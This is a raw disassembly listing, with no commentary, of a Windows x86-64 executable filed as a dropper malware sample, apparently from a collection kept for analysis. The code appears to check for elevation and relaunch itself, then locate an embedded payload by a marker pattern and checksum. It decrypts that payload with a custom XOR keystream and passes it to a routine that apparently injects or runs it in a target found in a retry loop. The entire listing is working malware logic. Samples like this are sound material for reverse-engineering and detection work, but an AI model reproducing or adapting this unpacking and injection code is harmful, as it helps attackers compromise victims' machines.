
malware_samples/dropper/e6d6e38d1c1e36f8b2aeb1be256f208e7bc280b7bec36c6b1ed2b0647e8d352d.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   140001005:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000100a:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000100f:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001014:	48 83 ec 68          	sub    $0x68,%rsp
   140001018:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   14000101d:	e8 7e 00 00 00       	call   0x1400010a0
   140001022:	8b 94 24 88 00 00 00 	mov    0x88(%rsp),%edx
   140001029:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   14000102e:	e8 fd 0a 00 00       	call   0x140001b30
   140001033:	ba 6d 00 00 00       	mov    $0x6d,%edx
   140001038:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   14000103d:	ff 15 15 72 00 00    	call   *0x7215(%rip)        # 0x140008258
   140001043:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001048:	45 33 c9             	xor    %r9d,%r9d
   14000104b:	45 33 c0             	xor    %r8d,%r8d
   14000104e:	33 d2                	xor    %edx,%edx
   140001050:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140001055:	ff 15 05 72 00 00    	call   *0x7205(%rip)        # 0x140008260
   14000105b:	85 c0                	test   %eax,%eax
   14000105d:	74 31                	je     0x140001090
   14000105f:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140001064:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140001069:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000106e:	ff 15 f4 71 00 00    	call   *0x71f4(%rip)        # 0x140008268
   140001074:	85 c0                	test   %eax,%eax
   140001076:	75 16                	jne    0x14000108e
   140001078:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000107d:	ff 15 ed 71 00 00    	call   *0x71ed(%rip)        # 0x140008270
   140001083:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140001088:	ff 15 4a 72 00 00    	call   *0x724a(%rip)        # 0x1400082d8
   14000108e:	eb b8                	jmp    0x140001048
   140001090:	8b 44 24 38          	mov    0x38(%rsp),%eax
   140001094:	48 83 c4 68          	add    $0x68,%rsp
   140001098:	c3                   	ret
   140001099:	cc                   	int3
   14000109a:	cc                   	int3
   14000109b:	cc                   	int3
   14000109c:	cc                   	int3
   14000109d:	cc                   	int3
   14000109e:	cc                   	int3
   14000109f:	cc                   	int3
   1400010a0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400010a5:	48 83 ec 78          	sub    $0x78,%rsp
   1400010a9:	c7 44 24 20 50 00 00 	movl   $0x50,0x20(%rsp)
   1400010b0:	00 
   1400010b1:	c7 44 24 24 03 00 00 	movl   $0x3,0x24(%rsp)
   1400010b8:	00 
   1400010b9:	48 8d 05 30 0b 00 00 	lea    0xb30(%rip),%rax        # 0x140001bf0
   1400010c0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400010c5:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   1400010cc:	00 
   1400010cd:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   1400010d4:	00 
   1400010d5:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   1400010dc:	00 
   1400010dd:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400010e2:	ba 00 7f 00 00       	mov    $0x7f00,%edx
   1400010e7:	33 c9                	xor    %ecx,%ecx
   1400010e9:	ff 15 e1 71 00 00    	call   *0x71e1(%rip)        # 0x1400082d0
   1400010ef:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400010f4:	48 c7 44 24 50 06 00 	movq   $0x6,0x50(%rsp)
   1400010fb:	00 00 
   1400010fd:	48 c7 44 24 58 6d 00 	movq   $0x6d,0x58(%rsp)
   140001104:	00 00 
   140001106:	48 8d 05 b3 ad 00 00 	lea    0xadb3(%rip),%rax        # 0x14000bec0
   14000110d:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001112:	e8 19 00 00 00       	call   0x140001130
   140001117:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000111c:	ff 15 86 71 00 00    	call   *0x7186(%rip)        # 0x1400082a8
   140001122:	48 83 c4 78          	add    $0x78,%rsp
   140001126:	c3                   	ret
   140001127:	cc                   	int3
   140001128:	cc                   	int3
   140001129:	cc                   	int3
   14000112a:	cc                   	int3
   14000112b:	cc                   	int3
   14000112c:	cc                   	int3
   14000112d:	cc                   	int3
   14000112e:	cc                   	int3
   14000112f:	cc                   	int3
   140001130:	40 56                	rex push %rsi
   140001132:	57                   	push   %rdi
   140001133:	48 81 ec a8 02 00 00 	sub    $0x2a8,%rsp
   14000113a:	33 c0                	xor    %eax,%eax
   14000113c:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   140001141:	48 8d 44 24 72       	lea    0x72(%rsp),%rax
   140001146:	48 8b f8             	mov    %rax,%rdi
   140001149:	33 c0                	xor    %eax,%eax
   14000114b:	b9 06 02 00 00       	mov    $0x206,%ecx
   140001150:	f3 aa                	rep stos %al,(%rdi)
   140001152:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140001158:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000115d:	33 c9                	xor    %ecx,%ecx
   14000115f:	ff 15 73 6f 00 00    	call   *0x6f73(%rip)        # 0x1400080d8
   140001165:	ff 15 dd 70 00 00    	call   *0x70dd(%rip)        # 0x140008248
   14000116b:	85 c0                	test   %eax,%eax
   14000116d:	75 14                	jne    0x140001183
   14000116f:	33 d2                	xor    %edx,%edx
   140001171:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001176:	e8 35 02 00 00       	call   0x1400013b0
   14000117b:	33 c9                	xor    %ecx,%ecx
   14000117d:	ff 15 5d 6f 00 00    	call   *0x6f5d(%rip)        # 0x1400080e0
   140001183:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000118a:	00 00 
   14000118c:	b9 94 06 00 00       	mov    $0x694,%ecx
   140001191:	e8 5a 04 00 00       	call   0x1400015f0
   140001196:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000119b:	48 83 7c 24 38 00    	cmpq   $0x0,0x38(%rsp)
   1400011a1:	75 05                	jne    0x1400011a8
   1400011a3:	e9 f7 01 00 00       	jmp    0x14000139f
   1400011a8:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400011ad:	48 83 c0 08          	add    $0x8,%rax
   1400011b1:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400011b6:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400011bb:	0f b6 00             	movzbl (%rax),%eax
   1400011be:	89 84 24 80 02 00 00 	mov    %eax,0x280(%rsp)
   1400011c5:	8b 84 24 80 02 00 00 	mov    0x280(%rsp),%eax
   1400011cc:	8b c8                	mov    %eax,%ecx
   1400011ce:	e8 59 0c 00 00       	call   0x140001e2c
   1400011d3:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400011d8:	48 83 7c 24 40 00    	cmpq   $0x0,0x40(%rsp)
   1400011de:	75 05                	jne    0x1400011e5
   1400011e0:	e9 ba 01 00 00       	jmp    0x14000139f
   1400011e5:	8b 84 24 80 02 00 00 	mov    0x280(%rsp),%eax
   1400011ec:	48 89 84 24 98 02 00 	mov    %rax,0x298(%rsp)
   1400011f3:	00 
   1400011f4:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1400011f9:	33 c0                	xor    %eax,%eax
   1400011fb:	48 8b 8c 24 98 02 00 	mov    0x298(%rsp),%rcx
   140001202:	00 
   140001203:	f3 aa                	rep stos %al,(%rdi)
   140001205:	8b 84 24 80 02 00 00 	mov    0x280(%rsp),%eax
   14000120c:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001211:	48 ff c1             	inc    %rcx
   140001214:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140001219:	48 8b f1             	mov    %rcx,%rsi
   14000121c:	8b c8                	mov    %eax,%ecx
   14000121e:	f3 a4                	rep movsb (%rsi),(%rdi)
   140001220:	c7 84 24 88 02 00 00 	movl   $0x0,0x288(%rsp)
   140001227:	00 00 00 00 
   14000122b:	8b 84 24 80 02 00 00 	mov    0x280(%rsp),%eax
   140001232:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001237:	8b 44 01 01          	mov    0x1(%rcx,%rax,1),%eax
   14000123b:	89 84 24 88 02 00 00 	mov    %eax,0x288(%rsp)
   140001242:	8b 84 24 88 02 00 00 	mov    0x288(%rsp),%eax
   140001249:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000124f:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140001255:	8b d0                	mov    %eax,%edx
   140001257:	33 c9                	xor    %ecx,%ecx
   140001259:	ff 15 89 6e 00 00    	call   *0x6e89(%rip)        # 0x1400080e8
   14000125f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001264:	48 83 7c 24 30 00    	cmpq   $0x0,0x30(%rsp)
   14000126a:	75 0f                	jne    0x14000127b
   14000126c:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140001271:	e8 76 0b 00 00       	call   0x140001dec
   140001276:	e9 24 01 00 00       	jmp    0x14000139f
   14000127b:	8b 84 24 88 02 00 00 	mov    0x288(%rsp),%eax
   140001282:	8b 8c 24 80 02 00 00 	mov    0x280(%rsp),%ecx
   140001289:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000128e:	48 8d 4c 0a 05       	lea    0x5(%rdx,%rcx,1),%rcx
   140001293:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140001298:	48 8b f1             	mov    %rcx,%rsi
   14000129b:	8b c8                	mov    %eax,%ecx
   14000129d:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000129f:	8b 84 24 80 02 00 00 	mov    0x280(%rsp),%eax
   1400012a6:	44 8b c0             	mov    %eax,%r8d
   1400012a9:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1400012ae:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400012b3:	e8 98 01 00 00       	call   0x140001450
   1400012b8:	8b 84 24 88 02 00 00 	mov    0x288(%rsp),%eax
   1400012bf:	44 8b c0             	mov    %eax,%r8d
   1400012c2:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   1400012c7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400012cc:	e8 3f 02 00 00       	call   0x140001510
   1400012d1:	c7 84 24 84 02 00 00 	movl   $0x0,0x284(%rsp)
   1400012d8:	00 00 00 00 
   1400012dc:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   1400012e3:	00 
   1400012e4:	c7 84 24 8c 02 00 00 	movl   $0x0,0x28c(%rsp)
   1400012eb:	00 00 00 00 
   1400012ef:	eb 10                	jmp    0x140001301
   1400012f1:	8b 84 24 8c 02 00 00 	mov    0x28c(%rsp),%eax
   1400012f8:	ff c0                	inc    %eax
   1400012fa:	89 84 24 8c 02 00 00 	mov    %eax,0x28c(%rsp)
   140001301:	83 bc 24 8c 02 00 00 	cmpl   $0xa,0x28c(%rsp)
   140001308:	0a 
   140001309:	7d 3a                	jge    0x140001345
   14000130b:	48 8d 0d ce 70 00 00 	lea    0x70ce(%rip),%rcx        # 0x1400083e0
   140001312:	e8 b9 04 00 00       	call   0x1400017d0
   140001317:	89 84 24 84 02 00 00 	mov    %eax,0x284(%rsp)
   14000131e:	83 bc 24 84 02 00 00 	cmpl   $0x0,0x284(%rsp)
   140001325:	00 
   140001326:	76 04                	jbe    0x14000132c
   140001328:	eb 1b                	jmp    0x140001345
   14000132a:	eb 17                	jmp    0x140001343
   14000132c:	48 8d 0d b5 70 00 00 	lea    0x70b5(%rip),%rcx        # 0x1400083e8
   140001333:	e8 b8 06 00 00       	call   0x1400019f0
   140001338:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   14000133d:	ff 15 b5 6d 00 00    	call   *0x6db5(%rip)        # 0x1400080f8
   140001343:	eb ac                	jmp    0x1400012f1
   140001345:	83 bc 24 84 02 00 00 	cmpl   $0x0,0x284(%rsp)
   14000134c:	00 
   14000134d:	74 41                	je     0x140001390
   14000134f:	48 c7 84 24 90 02 00 	movq   $0x0,0x290(%rsp)
   140001356:	00 00 00 00 00 
   14000135b:	48 8d 84 24 90 02 00 	lea    0x290(%rsp),%rax
   140001362:	00 
   140001363:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001368:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   14000136f:	00 
   140001370:	45 33 c9             	xor    %r9d,%r9d
   140001373:	44 8b 84 24 88 02 00 	mov    0x288(%rsp),%r8d
   14000137a:	00 
   14000137b:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140001380:	8b 8c 24 84 02 00 00 	mov    0x284(%rsp),%ecx
   140001387:	e8 34 59 00 00       	call   0x140006cc0
   14000138c:	89 44 24 48          	mov    %eax,0x48(%rsp)
   140001390:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140001395:	e8 52 0a 00 00       	call   0x140001dec
   14000139a:	e8 b1 06 00 00       	call   0x140001a50
   14000139f:	48 81 c4 a8 02 00 00 	add    $0x2a8,%rsp
   1400013a6:	5f                   	pop    %rdi
   1400013a7:	5e                   	pop    %rsi
   1400013a8:	c3                   	ret
   1400013a9:	cc                   	int3
   1400013aa:	cc                   	int3
   1400013ab:	cc                   	int3
   1400013ac:	cc                   	int3
   1400013ad:	cc                   	int3
   1400013ae:	cc                   	int3
   1400013af:	cc                   	int3
   1400013b0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400013b5:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400013ba:	57                   	push   %rdi
   1400013bb:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400013c2:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   1400013c9:	00 
   1400013ca:	48 8d 44 24 24       	lea    0x24(%rsp),%rax
   1400013cf:	48 8b f8             	mov    %rax,%rdi
   1400013d2:	33 c0                	xor    %eax,%eax
   1400013d4:	b9 6c 00 00 00       	mov    $0x6c,%ecx
   1400013d9:	f3 aa                	rep stos %al,(%rdi)
   1400013db:	c7 44 24 20 70 00 00 	movl   $0x70,0x20(%rsp)
   1400013e2:	00 
   1400013e3:	c7 44 24 24 40 00 00 	movl   $0x40,0x24(%rsp)
   1400013ea:	00 
   1400013eb:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   1400013f2:	00 00 
   1400013f4:	48 8d 05 85 6f 00 00 	lea    0x6f85(%rip),%rax        # 0x140008380
   1400013fb:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001400:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   140001407:	00 
   140001408:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000140d:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   140001414:	00 
   140001415:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000141a:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   140001421:	00 00 
   140001423:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   14000142a:	00 
   14000142b:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140001432:	00 00 
   140001434:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001439:	ff 15 01 6e 00 00    	call   *0x6e01(%rip)        # 0x140008240
   14000143f:	b8 01 00 00 00       	mov    $0x1,%eax
   140001444:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   14000144b:	5f                   	pop    %rdi
   14000144c:	c3                   	ret
   14000144d:	cc                   	int3
   14000144e:	cc                   	int3
   14000144f:	cc                   	int3
   140001450:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001455:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000145a:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000145f:	48 83 ec 18          	sub    $0x18,%rsp
   140001463:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140001468:	c7 00 ef be ad de    	movl   $0xdeadbeef,(%rax)
   14000146e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140001473:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001478:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000147c:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140001481:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001486:	48 89 48 10          	mov    %rcx,0x10(%rax)
   14000148a:	48 c7 04 24 00 00 00 	movq   $0x0,(%rsp)
   140001491:	00 
   140001492:	eb 0b                	jmp    0x14000149f
   140001494:	48 8b 04 24          	mov    (%rsp),%rax
   140001498:	48 ff c0             	inc    %rax
   14000149b:	48 89 04 24          	mov    %rax,(%rsp)
   14000149f:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400014a4:	48 39 04 24          	cmp    %rax,(%rsp)
   1400014a8:	73 56                	jae    0x140001500
   1400014aa:	48 8b 04 24          	mov    (%rsp),%rax
   1400014ae:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400014b3:	48 03 c8             	add    %rax,%rcx
   1400014b6:	48 8b c1             	mov    %rcx,%rax
   1400014b9:	0f b6 00             	movzbl (%rax),%eax
   1400014bc:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400014c1:	8b 09                	mov    (%rcx),%ecx
   1400014c3:	33 c8                	xor    %eax,%ecx
   1400014c5:	8b c1                	mov    %ecx,%eax
   1400014c7:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400014cc:	89 01                	mov    %eax,(%rcx)
   1400014ce:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400014d3:	8b 00                	mov    (%rax),%eax
   1400014d5:	c1 e0 05             	shl    $0x5,%eax
   1400014d8:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400014dd:	8b 09                	mov    (%rcx),%ecx
   1400014df:	c1 e9 1b             	shr    $0x1b,%ecx
   1400014e2:	0b c1                	or     %ecx,%eax
   1400014e4:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400014e9:	89 01                	mov    %eax,(%rcx)
   1400014eb:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400014f0:	8b 00                	mov    (%rax),%eax
   1400014f2:	05 de c0 37 13       	add    $0x1337c0de,%eax
   1400014f7:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400014fc:	89 01                	mov    %eax,(%rcx)
   1400014fe:	eb 94                	jmp    0x140001494
   140001500:	48 83 c4 18          	add    $0x18,%rsp
   140001504:	c3                   	ret
   140001505:	cc                   	int3
   140001506:	cc                   	int3
   140001507:	cc                   	int3
   140001508:	cc                   	int3
   140001509:	cc                   	int3
   14000150a:	cc                   	int3
   14000150b:	cc                   	int3
   14000150c:	cc                   	int3
   14000150d:	cc                   	int3
   14000150e:	cc                   	int3
   14000150f:	cc                   	int3
   140001510:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001515:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000151a:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000151f:	48 83 ec 18          	sub    $0x18,%rsp
   140001523:	48 c7 04 24 00 00 00 	movq   $0x0,(%rsp)
   14000152a:	00 
   14000152b:	eb 0b                	jmp    0x140001538
   14000152d:	48 8b 04 24          	mov    (%rsp),%rax
   140001531:	48 ff c0             	inc    %rax
   140001534:	48 89 04 24          	mov    %rax,(%rsp)
   140001538:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000153d:	48 39 04 24          	cmp    %rax,(%rsp)
   140001541:	0f 83 a0 00 00 00    	jae    0x1400015e7
   140001547:	33 d2                	xor    %edx,%edx
   140001549:	48 8b 04 24          	mov    (%rsp),%rax
   14000154d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001552:	48 f7 71 10          	divq   0x10(%rcx)
   140001556:	48 8b c2             	mov    %rdx,%rax
   140001559:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000155e:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001562:	0f b6 04 01          	movzbl (%rcx,%rax,1),%eax
   140001566:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000156b:	8b 09                	mov    (%rcx),%ecx
   14000156d:	33 c8                	xor    %eax,%ecx
   14000156f:	8b c1                	mov    %ecx,%eax
   140001571:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001576:	89 01                	mov    %eax,(%rcx)
   140001578:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000157d:	8b 00                	mov    (%rax),%eax
   14000157f:	69 c0 b1 79 37 9e    	imul   $0x9e3779b1,%eax,%eax
   140001585:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000158a:	8b 09                	mov    (%rcx),%ecx
   14000158c:	c1 e9 0d             	shr    $0xd,%ecx
   14000158f:	33 c1                	xor    %ecx,%eax
   140001591:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001596:	89 01                	mov    %eax,(%rcx)
   140001598:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000159d:	8b 00                	mov    (%rax),%eax
   14000159f:	c1 e8 10             	shr    $0x10,%eax
   1400015a2:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400015a7:	8b 09                	mov    (%rcx),%ecx
   1400015a9:	33 c8                	xor    %eax,%ecx
   1400015ab:	8b c1                	mov    %ecx,%eax
   1400015ad:	25 ff 00 00 00       	and    $0xff,%eax
   1400015b2:	88 44 24 08          	mov    %al,0x8(%rsp)
   1400015b6:	0f b6 44 24 08       	movzbl 0x8(%rsp),%eax
   1400015bb:	48 8b 0c 24          	mov    (%rsp),%rcx
   1400015bf:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   1400015c4:	48 03 d1             	add    %rcx,%rdx
   1400015c7:	48 8b ca             	mov    %rdx,%rcx
   1400015ca:	0f b6 09             	movzbl (%rcx),%ecx
   1400015cd:	33 c8                	xor    %eax,%ecx
   1400015cf:	8b c1                	mov    %ecx,%eax
   1400015d1:	48 8b 0c 24          	mov    (%rsp),%rcx
   1400015d5:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   1400015da:	48 03 d1             	add    %rcx,%rdx
   1400015dd:	48 8b ca             	mov    %rdx,%rcx
   1400015e0:	88 01                	mov    %al,(%rcx)
   1400015e2:	e9 46 ff ff ff       	jmp    0x14000152d
   1400015e7:	48 83 c4 18          	add    $0x18,%rsp
   1400015eb:	c3                   	ret
   1400015ec:	cc                   	int3
   1400015ed:	cc                   	int3
   1400015ee:	cc                   	int3
   1400015ef:	cc                   	int3
   1400015f0:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400015f4:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   1400015fb:	c7 44 24 3c 08 00 00 	movl   $0x8,0x3c(%rsp)
   140001602:	00 
   140001603:	c6 44 24 39 fe       	movb   $0xfe,0x39(%rsp)
   140001608:	c6 44 24 38 fa       	movb   $0xfa,0x38(%rsp)
   14000160d:	c6 44 24 28 ff       	movb   $0xff,0x28(%rsp)
   140001612:	33 c9                	xor    %ecx,%ecx
   140001614:	ff 15 ae 6a 00 00    	call   *0x6aae(%rip)        # 0x1400080c8
   14000161a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000161f:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140001624:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001629:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   14000162f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140001634:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001639:	ff 15 91 6a 00 00    	call   *0x6a91(%rip)        # 0x1400080d0
   14000163f:	48 83 f8 30          	cmp    $0x30,%rax
   140001643:	0f 85 74 01 00 00    	jne    0x1400017bd
   140001649:	81 7c 24 60 00 10 00 	cmpl   $0x1000,0x60(%rsp)
   140001650:	00 
   140001651:	0f 85 4c 01 00 00    	jne    0x1400017a3
   140001657:	8b 44 24 64          	mov    0x64(%rsp),%eax
   14000165b:	83 e0 66             	and    $0x66,%eax
   14000165e:	85 c0                	test   %eax,%eax
   140001660:	0f 84 3d 01 00 00    	je     0x1400017a3
   140001666:	8b 44 24 64          	mov    0x64(%rsp),%eax
   14000166a:	25 00 01 00 00       	and    $0x100,%eax
   14000166f:	85 c0                	test   %eax,%eax
   140001671:	0f 85 2c 01 00 00    	jne    0x1400017a3
   140001677:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000167c:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140001681:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140001686:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000168b:	48 83 7c 24 78 08    	cmpq   $0x8,0x78(%rsp)
   140001691:	0f 82 0c 01 00 00    	jb     0x1400017a3
   140001697:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   14000169e:	00 00 00 00 00 
   1400016a3:	eb 13                	jmp    0x1400016b8
   1400016a5:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   1400016ac:	00 
   1400016ad:	48 ff c0             	inc    %rax
   1400016b0:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400016b7:	00 
   1400016b8:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400016bd:	48 83 e8 08          	sub    $0x8,%rax
   1400016c1:	48 39 84 24 80 00 00 	cmp    %rax,0x80(%rsp)
   1400016c8:	00 
   1400016c9:	0f 87 d4 00 00 00    	ja     0x1400017a3
   1400016cf:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   1400016d6:	00 
   1400016d7:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400016dc:	48 03 c8             	add    %rax,%rcx
   1400016df:	48 8b c1             	mov    %rcx,%rax
   1400016e2:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   1400016e9:	00 
   1400016ea:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   1400016f1:	00 
   1400016f2:	0f b6 00             	movzbl (%rax),%eax
   1400016f5:	3d fe 00 00 00       	cmp    $0xfe,%eax
   1400016fa:	0f 85 9e 00 00 00    	jne    0x14000179e
   140001700:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140001707:	00 
   140001708:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   14000170c:	3d fa 00 00 00       	cmp    $0xfa,%eax
   140001711:	0f 85 87 00 00 00    	jne    0x14000179e
   140001717:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   14000171e:	00 
   14000171f:	0f b6 40 07          	movzbl 0x7(%rax),%eax
   140001723:	3d ff 00 00 00       	cmp    $0xff,%eax
   140001728:	75 74                	jne    0x14000179e
   14000172a:	c7 84 24 90 00 00 00 	movl   $0x0,0x90(%rsp)
   140001731:	00 00 00 00 
   140001735:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
   14000173c:	00 00 00 00 
   140001740:	eb 10                	jmp    0x140001752
   140001742:	8b 84 24 94 00 00 00 	mov    0x94(%rsp),%eax
   140001749:	ff c0                	inc    %eax
   14000174b:	89 84 24 94 00 00 00 	mov    %eax,0x94(%rsp)
   140001752:	83 bc 24 94 00 00 00 	cmpl   $0x8,0x94(%rsp)
   140001759:	08 
   14000175a:	7d 28                	jge    0x140001784
   14000175c:	48 63 84 24 94 00 00 	movslq 0x94(%rsp),%rax
   140001763:	00 
   140001764:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   14000176b:	00 
   14000176c:	0f b6 04 01          	movzbl (%rcx,%rax,1),%eax
   140001770:	8b 8c 24 90 00 00 00 	mov    0x90(%rsp),%ecx
   140001777:	03 c8                	add    %eax,%ecx
   140001779:	8b c1                	mov    %ecx,%eax
   14000177b:	89 84 24 90 00 00 00 	mov    %eax,0x90(%rsp)
   140001782:	eb be                	jmp    0x140001742
   140001784:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000178b:	39 84 24 90 00 00 00 	cmp    %eax,0x90(%rsp)
   140001792:	75 0a                	jne    0x14000179e
   140001794:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   14000179b:	00 
   14000179c:	eb 21                	jmp    0x1400017bf
   14000179e:	e9 02 ff ff ff       	jmp    0x1400016a5
   1400017a3:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400017a8:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400017ad:	48 03 c8             	add    %rax,%rcx
   1400017b0:	48 8b c1             	mov    %rcx,%rax
   1400017b3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400017b8:	e9 6c fe ff ff       	jmp    0x140001629
   1400017bd:	33 c0                	xor    %eax,%eax
   1400017bf:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   1400017c6:	c3                   	ret
   1400017c7:	cc                   	int3
   1400017c8:	cc                   	int3
   1400017c9:	cc                   	int3
   1400017ca:	cc                   	int3
   1400017cb:	cc                   	int3
   1400017cc:	cc                   	int3
   1400017cd:	cc                   	int3
